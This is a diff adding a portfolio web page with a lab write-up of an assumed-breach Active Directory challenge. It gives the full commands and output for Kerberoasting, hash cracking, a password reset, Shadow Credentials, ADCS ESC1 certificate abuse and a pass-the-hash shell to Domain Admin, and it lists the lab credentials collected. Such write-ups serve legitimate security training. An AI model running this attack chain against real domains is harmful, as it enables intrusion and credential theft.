@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Challenge Lab: Arasaka (Easy) | Colby</title>
+  <link rel="stylesheet" href="/styles.css" />
+  <script>
+    // Immediately apply saved theme to prevent flickering
+    (function() {
+      const savedTheme = localStorage.getItem('colby-portfolio-theme') || 'dark';
+      document.documentElement.setAttribute('data-theme', savedTheme);
+    })();
+  </script>
+</head>
+<body>
+
+  <!-- Global Header Navigation -->
+  <header class="global-header">
+    <div class="header-container">
+      <a href="/index.html" class="header-logo">
+        <span class="logo-icon">🛡️</span>
+        <span class="logo-text">Colby<span class="accent-dot">.</span></span>
+      </a>
+      <nav class="header-nav" aria-label="Primary site navigation">
+        <a href="/index.html" class="nav-item">Home</a>
+        <a href="/writeups.html" class="nav-item active">Writeups</a>
+        <a href="/reports.html" class="nav-item ">Reports</a>
+        <a href="/blog.html" class="nav-item ">Blog</a>
+      </nav>
+      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle dark/light mode">
+        <svg class="sun-icon" viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="5"></circle>
+          <line x1="12" y1="1" x2="12" y2="3"></line>
+          <line x1="12" y1="21" x2="12" y2="23"></line>
+          <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+          <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+          <line x1="1" y1="12" x2="3" y2="12"></line>
+          <line x1="21" y1="12" x2="23" y2="12"></line>
+          <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+          <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+        </svg>
+        <svg class="moon-icon" viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <!-- Ambient background -->
+  <div class="bg-texture"></div>
+
+  <!-- Main Post Content -->
+  <main class="post-page">
+
+    <a class="blog-back" href="/writeups.html">← back to writeups</a>
+
+    <p class="post-page-date">Jun 2026</p>
+    <h1 class="post-page-title">Challenge Lab: Arasaka (Easy)</h1>
+
+    <div class="post-content">
+      <h2 id="objective-and-scope">Objective and Scope</h2>
+
+<p>You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, faraday.</p>
+
+<p>The primary goal is to simulate a realistic attack, identifying and exploiting vulnerabilities to escalate privileges from a standard user to a Domain Administrator.</p>
+
+<hr />
+
+<h2 id="initial-creds">Initial Creds</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>faraday:hacksmarter123
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="recon-findings">Recon Findings</h2>
+
+<p>First grab the domain name and add it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 10.0.30.225
+SMB  10.0.30.225  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
+
+sudo nano /etc/hosts
+
+ping hacksmarter.local
+PING hacksmarter.local (10.0.30.225) 56(84) bytes of data.
+64 bytes from hacksmarter.local (10.0.30.225): icmp_seq=1 ttl=126 time=87.0 ms
+64 bytes from hacksmarter.local (10.0.30.225): icmp_seq=2 ttl=126 time=103 ms
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="kerberoasting-altsvc">Kerberoasting alt.svc</h2>
+
+<p>Used BloodHound to find a Kerberoastable account called <code class="language-plaintext highlighter-rouge">alt.svc</code>, then used Impacket to grab the hash:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs 'hacksmarter.local'/'faraday':'hacksmarter123' -dc-ip 10.0.30.225 -request
+
+ServicePrincipalName            Name     MemberOf  PasswordLastSet             LastLogon  Delegation
+------------------------------  -------  --------  --------------------------  ---------  ----------
+AI/blackwall.hacksmarter.local  alt.svc            2025-09-21 11:07:42.894050  &lt;never&gt;
+</code></pre></div></div>
+
+<p>Then cracked the hash with Hashcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+
+Status...........: Cracked
+</code></pre></div></div>
+
+<p><strong>Cracked password:</strong> <code class="language-plaintext highlighter-rouge">alt.svc:babygirl1</code></p>
+
+<hr />
+
+<h2 id="genericall---resetting-yorinobus-password">GenericAll - Resetting yorinobu’s Password</h2>
+
+<p>BloodHound showed that <code class="language-plaintext highlighter-rouge">alt.svc</code> has GenericAll over <code class="language-plaintext highlighter-rouge">yorinobu</code>, so we can just reset their password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net rpc password "yorinobu" "P@ssw0rd" -U "hacksmarter.local"/"alt.svc"%"babygirl1" -S "10.0.30.225"
+</code></pre></div></div>
+
+<p>Confirmed it worked:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 10.0.30.225 -u yorinobu -p P@ssw0rd
+
+SMB  10.0.30.225  445  DC01  [+] hacksmarter.local\yorinobu:P@ssw0rd
+</code></pre></div></div>
+
+<p><strong>New creds:</strong> <code class="language-plaintext highlighter-rouge">yorinobu:P@ssw0rd</code></p>
+
+<hr />
+
+<h2 id="shadow-credentials---owning-soulkillersvc">Shadow Credentials - Owning soulkiller.svc</h2>
+
+<p>BloodHound showed <code class="language-plaintext highlighter-rouge">yorinobu</code> has GenericWrite against <code class="language-plaintext highlighter-rouge">soulkiller.svc</code>, which lets us use pywhisker to do a Shadow Credentials attack:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pywhisker -d "hacksmarter.local" -u "yorinobu" -p "P@ssw0rd" --target "soulkiller.svc" --action "add"
+
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate &amp; key at path: J8EdZSHD.pfx
+[*] Must be used with password: oUFC0cN9QKafxhD7DlOc
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+</code></pre></div></div>
+
+<p>Then used Certipy to authenticate with the PFX and get the NT hash:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad auth -pfx J8EdZSHD.pfx -password 'oUFC0cN9QKafxhD7DlOc' -domain hacksmarter.local -username soulkiller.svc -dc-ip 10.0.30.225
+
+[*] Got TGT
+[*] Wrote credential cache to 'soulkiller.svc.ccache'
+[*] Got hash for 'soulkiller.svc@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a
+</code></pre></div></div>
+
+<p>We essentially own this account now.</p>
+
+<hr />
+
+<h2 id="adcs-enumeration---finding-esc1">ADCS Enumeration - Finding ESC1</h2>
+
+<p>The BloodHound description for <code class="language-plaintext highlighter-rouge">soulkiller.svc</code> said <em>“Certificate management for soulkiller AI”</em>, so I ran Certipy as this account to look for certificate misconfigs:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad find -u soulkiller.svc@hacksmarter.local -k -no-pass -target DC01.hacksmarter.local -dc-ip 10.0.30.225 -vulnerable -hashes aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a
+</code></pre></div></div>
+
+<p>The results revealed a lot. The important bits from the output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Template Name                       : AI_Takeover
+Certificate Authorities             : hacksmarter-DC01-CA
+Enrollee Supplies Subject           : True
+Extended Key Usage                  : Client Authentication
+Enrollment Rights                   : HACKSMARTER.LOCAL\Soulkiller.svc
+
+[!] Vulnerabilities
+    ESC1                            : Enrollee supplies subject and template allows client authentication.
+</code></pre></div></div>
+
+<p>ESC1 is vulnerable because the template lets us specify who the cert is for (Enrollee Supplies Subject) and it allows Client Authentication - meaning we can request a cert as any user, including Domain Admins.</p>
+
+<hr />
+
+<h2 id="esc1-exploitation---getting-domain-admin">ESC1 Exploitation - Getting Domain Admin</h2>
+
+<p>Requested a certificate as <code class="language-plaintext highlighter-rouge">administrator</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad req -u soulkiller.svc@hacksmarter.local -hashes aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn administrator@hacksmarter.local -dc-ip 10.0.30.225
+
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@hacksmarter.local'
+[*] Wrote certificate and private key to 'administrator.pfx'
+</code></pre></div></div>
+
+<p>But authenticating as <code class="language-plaintext highlighter-rouge">administrator</code> I hit a wall with it being an expired password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad auth -pfx administrator.pfx -domain hacksmarter.local -dc-ip 10.0.30.225
+
+[-] Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
+</code></pre></div></div>
+
+<p>So I tried a different admin account I have seen before in bloodhound <code class="language-plaintext highlighter-rouge">the_emperor</code>. Same method, requested a cert with their UPN, and this time it worked:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy-ad auth -pfx the_emperor.pfx -domain hacksmarter.local -dc-ip 10.0.30.225
+
+[*] Got TGT
+[*] Got hash for 'the_emperor@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="shell-on-the-dc">Shell on the DC</h2>
+
+<p>Used Evil-WinRM to get a shell with the hash:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i dc01.hacksmarter.local -u the_emperor -H d87640b0d83dc7f90f5f30bd6789b133
+
+*Evil-WinRM* PS C:\Users\the_emperor\Documents&gt;
+</code></pre></div></div>
+
+<p>Confirmed Domain Admin:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\the_emperor\Documents&gt; net user the_emperor
+
+Global Group memberships     *Domain Users         *Domain Admins
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; cat root.txt
+fcf1dd0f08d1068a2f151fd2ec5ecf05
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="attack-chain">Attack Chain</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>faraday (standard user)
+  → Kerberoasting → alt.svc (babygirl1)
+    → GenericAll → yorinobu (password reset)
+      → GenericWrite → soulkiller.svc (Shadow Credentials → NT hash)
+        → ADCS ESC1 (AI_Takeover template) → the_emperor cert
+          → PKINIT auth → the_emperor NT hash → Domain Admin shell
+</code></pre></div></div>
+
+<hr />
+
+<p>Completion
+https://www.hacksmarter.org/completion/303a188282289198</p>
+
+<h2 id="creds-collected">Creds Collected</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Account</th>
+      <th>Type</th>
+      <th>Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>faraday</td>
+      <td>Password</td>
+      <td>hacksmarter123</td>
+    </tr>
+    <tr>
+      <td>alt.svc</td>
+      <td>Password</td>
+      <td>babygirl1</td>
+    </tr>
+    <tr>
+      <td>yorinobu</td>
+      <td>Password</td>
+      <td>P@ssw0rd</td>
+    </tr>
+    <tr>
+      <td>soulkiller.svc</td>
+      <td>NT Hash</td>
+      <td>aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a</td>
+    </tr>
+    <tr>
+      <td>the_emperor</td>
+      <td>NT Hash</td>
+      <td>aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133</td>
+    </tr>
+  </tbody>
+</table>
+
+    </div>
+
+    <div class="post-footer-nav">
+      <a class="blog-back" href="/writeups.html">← back to writeups</a>
+    </div>
+
+  </main>
+
+  <!-- Global Footer -->
+  <footer>
+    <div class="footer-container">
+      <div class="footer-links">
+        <a href="/index.html">Home</a>
+        <a href="/writeups.html">Writeups</a>
+        <a href="/reports.html">Reports</a>
+        <a href="/blog.html">Blog</a>
+      </div>
+      <p class="copyright">&copy; <span id="year">2026</span> Colby. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script src="/script.js"></script>
+</body>
+</html>
